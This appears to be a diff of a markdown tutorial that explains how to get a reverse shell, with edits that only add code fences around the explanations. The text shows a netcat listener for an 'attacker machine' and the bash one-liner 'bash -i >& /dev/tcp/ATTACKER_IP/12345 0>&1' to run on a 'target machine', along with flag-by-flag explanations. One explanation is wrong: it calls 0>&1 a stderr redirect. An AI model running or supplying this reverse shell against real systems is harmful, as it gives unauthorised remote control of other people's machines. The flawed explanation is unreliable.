@@ -31,6 +31,7 @@ On your attacker machine (Kali, VPS, Oracle Cloud, etc.), open a port to receive
 nc -lvnp 12345
 ```
 
+```sh
     -l → listen mode
 
     -v → verbose
@@ -38,6 +39,7 @@ nc -lvnp 12345
     -n → skip DNS
 
     -p 12345 → port to listen on
+```
 
 ✅ Important:
 If you're using Oracle Cloud, AWS, or any VPS, you must manually open the port (e.g., 12345) in your security rules / firewall settings.
@@ -49,11 +51,14 @@ On the target machine (Linux, Windows, macOS, etc.), run the following command:
 ```bash
 bash -i >& /dev/tcp/ATTACKER_IP/12345 0>&1
 ```
+
+```sh
     bash -i → start an interactive shell
 
     >& /dev/tcp/ATTACKER_IP/12345 → redirect stdin and stdout to the attacker's IP and port
 
     0>&1 → redirect stderr to stdout
+````
 
 🔗 **Note:** Replace `ATTACKER_IP` with your IP address.
 If everything is correct, you’ll see a connection like:
